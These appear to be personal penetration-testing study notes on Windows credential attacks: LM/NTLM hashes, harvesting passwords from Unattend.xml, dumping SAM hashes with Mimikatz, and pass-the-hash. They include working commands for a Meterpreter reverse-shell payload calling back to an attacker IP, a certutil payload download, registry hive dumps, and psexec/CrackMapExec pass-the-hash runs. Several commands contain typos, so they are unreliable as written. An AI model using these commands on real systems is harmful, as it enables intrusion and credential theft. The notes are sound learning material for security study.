--- 
## Windows Password Hashes

-  The Windows OS stores hashed user account passwords locally in the SAM (Security Accounts Manager) database.

-  Hashing is the process of converting a piece of data into another value. A hashing function or algorithm is used to generate the new value. The result of a hashing algorithm is known as a hash or hash value.

-  Authentication and verification of user credentials is facilitated by the Local Security Authority (LSA).

-  Windows versions up to Windows Server 2003 utilize two different types of hashes:
	+ LM
	+ NTLM

- Windows disables LM hashing and utilizes NTLM hashing from Windows Vista onwards.

### SAM Database
 SAM (Security Account Manager) is a database file that is responsible for managing user accounts and passwords on Windows. All user account passwords stored in the SAM database are hashed.

-  The SAM database file cannot be copied while the operating system is running.

- The Windows NT kernel keeps the SAM database file locked and as a result, attackers typically utilize in-memory techniques and tools to dump SAM hashes from the LSASS process.
-  In modern versions of Windows, the SAM database is encrypted with a syskey.

> **Note:** Elevated/Administrative privileges are required in order to access and interact with the LSASS process.

### LM (LanMan)

 - LM is the default hashing algorithm that was implemented in Windows operating systems prior to NT4.0.

- The protocol is used to hash user passwords, and the hashing process can be broken down into the following steps:
	+ The password is broken into two seven-character chunks.
	+ All characters are then converted into uppercase.
	+ Each chunk is then hashed separately with the DES algorithm.

- LM hashing is generally considered to be a weak protocol and can easily be cracked, primarily because the password hash does not include salts, consequently making brute force and rainbow table attacks effective against LM hashes.

![[Pasted image 20230414111830.png]]


### NTLM (NTHash)
 NTLM is a collection of authentication protocols that are utilized in Windows to facilitate authentication between computers. The authentication process involves using a valid username and password to authenticate successfully.

-  From Windows Vista onwards, Windows disables LM hashing and utilizes NTLM
hashing.

 - When a user account is created, it is encrypted using the MD4 hashing algorithm, while
the original password is disposed of.

- NTLM improves upon LM in the following ways:
	+ Does not split the hash in to two chunks.
	+ Case sensitive.
	+ Allows the use of symbols and unicode characters.

![[Pasted image 20230414111926.png]]

## Windows Configuration Files

 Windows can automate a variety of repetitive tasks, such as the mass rollout or
installation of Windows on many systems.

 This is typically done through the use of the Unattended Windows Setup utility,
which is used to automate the mass installation/deployment of Windows on
systems.

-  This tool utilizes configuration files that contain specific configurations and user
account credentials, specifically the Administrator account’s password.

 - If the **Unattended Windows Setup** configuration files are left on the target
system after installation, they can reveal user account credentials that can be
used by attackers to authenticate with Windows target legitimately.

### Unattended Windows Setup

The Unattended Windows Setup utility will typically utilize one of the following
configuration files that contain user account and system configuration
information:

	 C:\Windows\Panther\Unattend.xml
	 C:\Windows\Panther\Autounattend.xml


``` bash 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f :xo > payload.exe

 python -m SimpleHTTPServer 80
```

``` powershell
certutil -urlcache -f http://10.10.5.2/payload.exe payload.exe
```


``` bash
meterpreter > search -f Unattend.xml
```

![[Pasted image 20230414115058.png]]
-  As a security precaution, the passwords stored in the Unattended Windows
Setup configuration file may be **encoded in base64.**

## Dumping Hashes With Mimikatz

### [Mimikatz](https://github.com/ParrotSec/mimikatz)

Mimikatz is a Windows post-exploitation tool written by Benjamin Delpy (@gentilkiwi). It allows for the extraction of clear-text passwords, hashes and Kerberos tickets from memory.

 - The SAM (Security Account Manager) database, is a database file on Windows systems that stores hashed user passwords.

- Mimikatz can be **used to extract hashes from the lsass.exe** process memory where hashes are cached.

- We can utilize the pre-compiled mimikatz executable, alternatively, if we have access to a meterpreter session on a Windows target, we can utilize the inbuilt meterpreter extension **Kiwi**.

> **Note:** Mimikatz will require elevated privileges in order to run correctly.

### [Steps To use Mimikatz](https://www.ultimatewindowssecurity.com/blog/default.aspx?p=c2bacbe0-d4fc-4876-b6a3-1995d653f32a)
1. We need to extract and copy the SYSTEM and SAM registry hives for the local machine.  We do this by running `“reg save hklm\sam filename1.hiv”` and `“reg save hklm\security filename2.hiv”`


2. We must run at elevated privileges for the command to run successfully.  We do this by running `“privilege::debug”` and then `“token::elevate”`.

3. Now we can run the `“lsadump::sam filename1.hiv filename2.hiv”` from step 1 above successfully.  It will display the username and hashes for all local users.

4. Navigate to the directory where mimikatz is located on your machine.  In my instance it’s located in `C:\Users\BarryVista\Downloads\mimikatz\x64`.  Here you will find the output in the hash.txt file.
``` powershell
> reg save hklm\sam filename1.hiv
> reg save hklm\security filename2.hiv

> mimikatz
mimikatz > privilege::debug
mimikatz > token::elevate
mimikatz > lsadump::sam filename1.hiv filename2.hiv

```

### Pass-The-Hash Attacks

Pass-the-hash is an exploitation technique that involves capturing or harvesting NTLM hashes or clear-text passwords and utilizing them to authenticate with the target legitimately.
+ We can use multiple tools to facilitate a Pass-The-Hash attack:
	1.  Metasploit PsExec module
	2. Crackmapexec

+ This technique will allow us to obtain access to the target system via legitimate credentials as opposed to obtaining access via service exploitation

### Steps to accompliche Pass-the-hash Attack:

1. Steal password hashes
2. Authenticate using a stolen password hash
3. Access other resources

``` bash
msf > use exploit/windows/smb/psexec

msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > set SMBUser  Administrator
msf exploit(psexec) > set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c
msf exploit(psexec) > exploit
```

```bash 
cracknapexec smb 10.10.10.4 -u Ryan -H 09238831blaf5edab93c773f56409d96 
```